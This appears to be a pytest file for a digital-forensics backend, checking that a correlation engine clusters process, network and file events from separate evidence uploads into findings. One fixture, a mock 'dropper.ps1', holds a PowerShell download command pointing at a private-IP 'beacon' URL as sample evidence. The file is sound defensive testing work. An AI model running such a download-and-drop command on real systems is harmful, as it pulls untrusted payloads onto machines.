import io
from datetime import datetime, timezone, timedelta
from fastapi.testclient import TestClient
from backend.app.main import app


def test_multi_evidence_correlation_engine():
    with TestClient(app) as client:
        # 1. Create a dedicated forensic case
        case_res = client.post(
            "/api/v1/cases",
            json={
                "name": "Phase 5 Multi-Evidence Correlation Case",
                "description": "Correlating memory execution, network sockets, and filesystem events.",
                "investigator": "A. Abhiram",
                "status": "Analyzing",
            },
        )
        assert case_res.status_code == 201
        case_id = case_res.json()["id"]

        # 2. Upload Evidence #1: Executable script
        script_bytes = b"Invoke-WebRequest -Uri http://192.168.1.100/beacon -OutFile test.dat\n"
        evi1_res = client.post(
            f"/api/v1/cases/{case_id}/evidence",
            files={"file": ("dropper.ps1", io.BytesIO(script_bytes), "text/plain")},
            data={"file_type": "File"},
        )
        assert evi1_res.status_code == 201
        evi1_id = evi1_res.json()["id"]

        # 3. Upload Evidence #2: System Log
        log_bytes = b'{"event_id": 4688, "process": "powershell.exe", "caller": "cmd.exe"}\n'
        evi2_res = client.post(
            f"/api/v1/cases/{case_id}/evidence",
            files={"file": ("security_event.json", io.BytesIO(log_bytes), "application/json")},
            data={"file_type": "System Log"},
        )
        assert evi2_res.status_code == 201
        evi2_id = evi2_res.json()["id"]

        # 4. Inject specific correlated events within a tight 12-second window
        t_base = datetime.now(timezone.utc) - timedelta(hours=1)

        # Event 1: Memory Process Started (from Evidence #2 / Volatility)
        ev1_res = client.post(
            "/api/v1/timeline/events",
            json={
                "case_id": case_id,
                "evidence_id": evi2_id,
                "timestamp": t_base.isoformat(),
                "timestamp_source": "Volatility 3 (windows.pslist)",
                "event_type": "Process Started",
                "artifact_category": "Memory Image",
                "description": "Process powershell.exe spawned with PID 4128",
                "confidence": 0.95,
                "classification": "OBSERVED",
            },
        )
        assert ev1_res.status_code == 201

        # Event 2: Network Activity (from Evidence #2 / Netscan)
        ev2_res = client.post(
            "/api/v1/timeline/events",
            json={
                "case_id": case_id,
                "evidence_id": evi2_id,
                "timestamp": (t_base + timedelta(seconds=4)).isoformat(),
                "timestamp_source": "Volatility 3 (windows.netscan)",
                "event_type": "Network Activity",
                "artifact_category": "Network Evidence",
                "description": "Established TCP socket connection to 192.168.1.100:443",
                "confidence": 0.92,
                "classification": "OBSERVED",
            },
        )
        assert ev2_res.status_code == 201

        # Event 3: Filesystem modification of dropper (from Evidence #1)
        ev3_res = client.post(
            "/api/v1/timeline/events",
            json={
                "case_id": case_id,
                "evidence_id": evi1_id,
                "timestamp": (t_base + timedelta(seconds=9)).isoformat(),
                "timestamp_source": "Filesystem MACB ($FILE_MODIFY)",
                "event_type": "File Modified",
                "artifact_category": "File",
                "description": "dropper.ps1 modified on disk during execution window",
                "confidence": 1.0,
                "classification": "OBSERVED",
            },
        )
        assert ev3_res.status_code == 201

        # 5. Execute Multi-Evidence Correlation Engine with 30s window
        corr_res = client.post(
            f"/api/v1/cases/{case_id}/correlate",
            json={
                "time_window_seconds": 30,
                "min_cluster_size": 2,
                "generate_findings": True,
            },
        )
        assert corr_res.status_code == 200
        corr_data = corr_res.json()

        assert corr_data["case_id"] == case_id
        assert corr_data["total_clusters"] >= 1
        assert corr_data["multi_source_correlations_count"] >= 1
        assert corr_data["findings_generated_count"] >= 1

        # Find the multi-source cluster
        multi_clusters = [c for c in corr_data["clusters"] if c["evidence_sources_count"] >= 2]
        assert len(multi_clusters) >= 1
        cluster = multi_clusters[0]

        assert cluster["cluster_classification"] == "CORRELATED"
        assert cluster["confidence"] >= 0.80
        assert cluster["event_count"] >= 3
        assert "dropper.ps1" in cluster["evidence_filenames"]
        assert "security_event.json" in cluster["evidence_filenames"]

        # Check relative time offsets within cluster
        events_in_cluster = cluster["events"]
        deltas = [e["time_delta_seconds"] for e in events_in_cluster]
        assert deltas[0] == 0.0
        assert any(d > 0.0 for d in deltas)

        # 6. Verify Findings API returns the synthesized finding
        findings_res = client.get(f"/api/v1/cases/{case_id}/findings")
        assert findings_res.status_code == 200
        findings = findings_res.json()
        assert len(findings) >= 1
        finding = findings[0]
        assert finding["classification"] == "CORRELATED"
        assert finding["confidence"] >= 0.80
        assert len(finding["supporting_artifacts"]) >= 2
        assert "Correlation" in finding["finding_type"]

        # 7. Query read-only correlations endpoint
        get_corr_res = client.get(f"/api/v1/cases/{case_id}/correlations?time_window_seconds=30")
        assert get_corr_res.status_code == 200
        get_corr_data = get_corr_res.json()
        assert get_corr_data["total_clusters"] == corr_data["total_clusters"]

